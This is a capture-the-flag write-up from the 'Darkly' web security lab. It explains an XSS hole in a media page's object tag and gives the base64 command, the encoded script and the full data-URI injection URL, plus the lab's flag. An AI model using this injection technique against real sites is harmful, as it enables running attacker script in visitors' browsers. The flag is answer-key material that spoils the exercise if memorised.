# XSS - Object

See [XSS_Recover_Password](https://github.com/anyashuka/Darkly/tree/master/XSS_Recover_Password) for more XSS description, use and prevention.


## Breach

Go to page:

{VM_IP}/index.php?page=media&src=nsa

inspect elements shows src argument inserted directly into data field of object tag: <br>
<object data="{VM_IP}/images/nsa_prism.jpg"></object>

Injecting html normally won't work because quotation marks are handled properly.
however, you can inject serialized html (serializing converts an object into a stream of bytes).

```echo '<script>alert("Oh hi!")</script>' | base64```

This produces a serialized version of the script to be run: <br>
PHNjcmlwdD5hbGVydCgiT2ggaGkhIik8L3NjcmlwdD4K

Replace the original image source with serialized script:

{VM_IP}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiT2ggaGkhIik8L3NjcmlwdD4K

And the flag appears! 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D


## Use

User can execute malicious code on client machine.


## Prevention

Validate input before use.
All elements to be displayed should be retrieved on the server side only.
